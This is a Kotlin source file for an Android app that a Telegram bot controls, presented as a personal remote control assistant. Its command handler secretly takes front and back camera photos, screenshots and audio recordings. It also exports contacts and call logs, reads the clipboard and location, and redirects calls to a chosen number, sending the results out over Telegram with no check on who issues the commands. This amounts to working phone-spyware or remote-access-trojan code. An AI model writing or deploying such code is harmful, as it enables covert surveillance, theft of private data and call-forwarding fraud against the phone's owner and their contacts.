package com.example.telegrambot.handlers

import android.content.Context
import com.example.telegrambot.data.MessageEntity
import com.example.telegrambot.data.MessageType
import com.example.telegrambot.helpers.AdvancedControlHelper
import com.example.telegrambot.network.TelegramApi
import com.example.telegrambot.utils.Preferences
import kotlinx.coroutines.*

object MessageHandler {
    
    private val handlerScope = CoroutineScope(Dispatchers.IO)

    fun processMessage(context: Context, message: MessageEntity) {
        handlerScope.launch {
            try {
                when {
                    message.type == MessageType.COMMAND -> {
                        handleCommand(context, message)
                    }
                    message.type == MessageType.TEXT -> {
                        handleTextMessage(context, message)
                    }
                    message.type == MessageType.CALLBACK -> {
                        handleCallback(context, message)
                    }
                    message.type == MessageType.INLINE_QUERY -> {
                        handleInlineQuery(context, message)
                    }
                }
            } catch (e: Exception) {
                // Log error
            }
        }
    }

    private suspend fun handleCommand(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        val command = message.content.split(" ").firstOrNull()?.lowercase() ?: return
        val args = message.content.split(" ").drop(1)

        when (command) {
            "/start" -> {
                val welcome = """
                    🤖 *Welcome to PhoneTelegramBot!*
                    
                    Your personal remote control assistant.
                    
                    *Quick Start*
                    /help - Full list of commands
                    /status - Device status overview
                    /camera - Take a photo
                    
                    *Popular*
                    /screenshot • /location • /record
                    /torch • /vibrate • /volume
                """.trimIndent()
                TelegramApi.sendMessage(token, chatId, welcome, "Markdown")
            }
            "/help" -> {
                val help = """
                    📋 *Available Commands*
                    
                    *📷 Media & Capture*
                    /camera or /camera_back - Back camera photo
                    /camera_front - Front camera photo
                    /screenshot - Capture current screen
                    /record - Record 40s audio
                    /gallery - Recent gallery photos
                    
                    *📍 Device Info*
                    /status - Full device status
                    /location - Current GPS location
                    /ip - Local + Public IP
                    /uptime - Device uptime
                    /info - Bot information
                    /time - Current device time
                    
                    *📂 Data*
                    /contacts - Export contacts
                    /call_log - Export call logs
                    /clipboard - Read clipboard
                    
                    *🎛️ Advanced Controls*
                    /torch or /flashlight - Toggle flashlight
                    /vibrate [ms] - Vibrate device (default 1000ms)
                    /volume - Show volume levels
                    /volume <0-100> - Set media volume
                    /toast <message> - Show toast on phone
                    /speak <text> - Speak text (TTS)
                    /apps - List installed user apps
                    /open <package|name> - Open an app
                    /ring - Make the phone ring
                    /forward <number> - Setup call forwarding
                    
                    *Misc*
                    /ping - Check if bot is alive
                    /echo <text> - Echo message
                """.trimIndent()
                TelegramApi.sendMessage(token, chatId, help, "Markdown")
            }
            "/contacts" -> {
                val file = com.example.telegrambot.helpers.ContactsHelper.getContactsFile(context)
                if (file != null) {
                    TelegramApi.sendDocument(token, chatId, file)
                } else {
                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read contacts. Check permissions.")
                }
            }
            "/call_log" -> {
                val file = com.example.telegrambot.helpers.CallLogHelper.getCallLogsFile(context)
                if (file != null) {
                    TelegramApi.sendDocument(token, chatId, file)
                } else {
                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read call logs. Check permissions.")
                }
            }
            "/gallery" -> {
                val msg = com.example.telegrambot.helpers.GalleryHelper.getRecentGalleryPathsMessage(context, limit = 5)
                TelegramApi.sendMessage(token, chatId, msg)
            }
            "/camera_front" -> {
                TelegramApi.sendMessage(token, chatId, "📸 Taking front photo...")
                com.example.telegrambot.helpers.CameraHelper.takePhoto(context, useFront = true) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "Front Camera") }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to take photo. Check permissions.") }
                    }
                }
            }
            "/camera", "/camera_back" -> {
                TelegramApi.sendMessage(token, chatId, "📸 Taking back photo...")
                com.example.telegrambot.helpers.CameraHelper.takePhoto(context, useFront = false) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "Back Camera") }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to take photo. Check permissions.") }
                    }
                }
            }
            "/screenshot" -> {
                TelegramApi.sendMessage(token, chatId, "📸 Capturing snapshot...")
                com.example.telegrambot.helpers.ScreenshotHelper.takeScreenshot(context) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendPhoto(token, chatId, file, "System Snapshot") }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to capture snapshot.") }
                    }
                }
            }
            "/location" -> {
                TelegramApi.sendMessage(token, chatId, "📍 Retrieving coordinates...")
                com.example.telegrambot.helpers.LocationHelper.getLocation(context) { result ->
                    handlerScope.launch { TelegramApi.sendMessage(token, chatId, result, "Markdown") }
                }
            }
            "/clipboard" -> {
                com.example.telegrambot.helpers.ClipboardHelper.getClipboardText(context) { result ->
                    handlerScope.launch { TelegramApi.sendMessage(token, chatId, result, "Markdown") }
                }
            }
            "/forward" -> {
                if (args.isNotEmpty()) {
                    val number = args[0]
                    val success = com.example.telegrambot.helpers.CallForwardingHelper.setupForwarding(context, number)
                    if (success) {
                        TelegramApi.sendMessage(token, chatId, "✅ Call forwarding initiated to $number")
                    } else {
                        TelegramApi.sendMessage(token, chatId, "❌ Failed to setup call forwarding. Check permissions.")
                    }
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /forward <number>")
                }
            }
            "/ring" -> {
                com.example.telegrambot.helpers.RemoteControlHelper.ringDevice(context)
                TelegramApi.sendMessage(token, chatId, "🔊 Ringing device!")
            }
            "/status" -> {
                val statusMessage = com.example.telegrambot.helpers.DeviceStatusHelper.getStatusMessage(context)
                TelegramApi.sendMessage(token, chatId, statusMessage, "Markdown")
            }
            "/record" -> {
                TelegramApi.sendMessage(token, chatId, "🎙️ Recording 40 seconds of audio...")
                com.example.telegrambot.helpers.AudioRecordHelper.recordAudio(context, 40000) { file ->
                    if (file != null) {
                        handlerScope.launch { TelegramApi.sendDocument(token, chatId, file) }
                    } else {
                        handlerScope.launch { TelegramApi.sendMessage(token, chatId, "❌ Failed to record audio. Check permissions.") }
                    }
                }
            }
            "/ping" -> {
                TelegramApi.sendMessage(token, chatId, "🏓 Pong!")
            }
            "/echo" -> {
                val text = args.joinToString(" ")
                if (text.isNotEmpty()) {
                    TelegramApi.sendMessage(token, chatId, "📢 $text")
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /echo <text>")
                }
            }
            "/time" -> {
                val time = java.text.SimpleDateFormat(
                    "yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.getDefault()
                ).format(java.util.Date())
                TelegramApi.sendMessage(token, chatId, "🕐 $time")
            }
            "/info" -> {
                val info = TelegramApi.getMe(token)
                if (info.ok && info.result != null) {
                    val bot = info.result
                    val msg = """
                        🤖 *Bot Info*
                        ID: ${bot.id}
                        Name: ${bot.first_name}
                        Username: @${bot.username ?: "Not set"}
                    """.trimIndent()
                    TelegramApi.sendMessage(token, chatId, msg, "Markdown")
                }
            }

            // ─────────────── Advanced Features ───────────────

            "/torch", "/flashlight" -> {
                val result = AdvancedControlHelper.toggleTorch(context)
                TelegramApi.sendMessage(token, chatId, result, "Markdown")
            }
            "/vibrate" -> {
                val duration = args.firstOrNull()?.toLongOrNull() ?: 1000L
                val result = AdvancedControlHelper.vibrate(context, duration.coerceIn(100, 10000))
                TelegramApi.sendMessage(token, chatId, result)
            }
            "/volume" -> {
                if (args.isEmpty()) {
                    val info = AdvancedControlHelper.getVolumeInfo(context)
                    TelegramApi.sendMessage(token, chatId, info, "Markdown")
                } else {
                    val percent = args[0].toIntOrNull()
                    if (percent != null) {
                        val result = AdvancedControlHelper.setMediaVolume(context, percent)
                        TelegramApi.sendMessage(token, chatId, result)
                    } else {
                        TelegramApi.sendMessage(token, chatId, "Usage: /volume or /volume <0-100>")
                    }
                }
            }
            "/toast" -> {
                val text = args.joinToString(" ")
                if (text.isNotEmpty()) {
                    val result = AdvancedControlHelper.showToast(context, text)
                    TelegramApi.sendMessage(token, chatId, result)
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /toast <message>")
                }
            }
            "/speak" -> {
                val text = args.joinToString(" ")
                if (text.isNotEmpty()) {
                    val result = AdvancedControlHelper.speak(context, text)
                    TelegramApi.sendMessage(token, chatId, result)
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /speak <text>")
                }
            }
            "/ip" -> {
                TelegramApi.sendMessage(token, chatId, "🌐 Fetching IP addresses...")
                val local = AdvancedControlHelper.getLocalIp()
                val publicIp = AdvancedControlHelper.getPublicIp()
                val msg = """
                    🌐 *IP Addresses*
                    
                    • Local: `$local`
                    • Public: `$publicIp`
                """.trimIndent()
                TelegramApi.sendMessage(token, chatId, msg, "Markdown")
            }
            "/uptime" -> {
                val result = AdvancedControlHelper.getUptime()
                TelegramApi.sendMessage(token, chatId, result)
            }
            "/apps" -> {
                TelegramApi.sendMessage(token, chatId, "📱 Fetching installed apps...")
                val result = AdvancedControlHelper.getInstalledApps(context)
                if (result.length > 4000) {
                    result.chunked(4000).forEach { chunk ->
                        TelegramApi.sendMessage(token, chatId, chunk, "Markdown")
                    }
                } else {
                    TelegramApi.sendMessage(token, chatId, result, "Markdown")
                }
            }
            "/open" -> {
                val target = args.joinToString(" ")
                if (target.isNotEmpty()) {
                    val result = AdvancedControlHelper.openApp(context, target)
                    TelegramApi.sendMessage(token, chatId, result, "Markdown")
                } else {
                    TelegramApi.sendMessage(token, chatId, "Usage: /open <package name or app name>\nExample: /open com.android.chrome")
                }
            }

            else -> {
                TelegramApi.sendMessage(
                    token, chatId,
                    "❌ Unknown command. Use /help for available commands."
                )
            }
        }
    }

    private suspend fun handleTextMessage(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        
        when {
            message.content.contains("hello", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "👋 Hello! How can I help?")
            }
            message.content.contains("bye", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "👋 Goodbye! Have a great day!")
            }
            message.content.contains("help", ignoreCase = true) -> {
                TelegramApi.sendMessage(token, chatId, "Try /help for available commands.")
            }
        }
    }

    private suspend fun handleCallback(context: Context, message: MessageEntity) {
        val token = Preferences.getBotToken(context) ?: return
        val chatId = message.chatId
        
        when (message.content) {
            "button_clicked" -> {
                TelegramApi.sendMessage(token, chatId, "✅ Button clicked!")
            }
            "confirm" -> {
                TelegramApi.sendMessage(token, chatId, "✅ Confirmed!")
            }
            "cancel" -> {
                TelegramApi.sendMessage(token, chatId, "❌ Cancelled.")
            }
        }
    }

    private suspend fun handleInlineQuery(context: Context, message: MessageEntity) {
        // Handle inline queries
        // This would be implemented with answerInlineQuery
    }
}
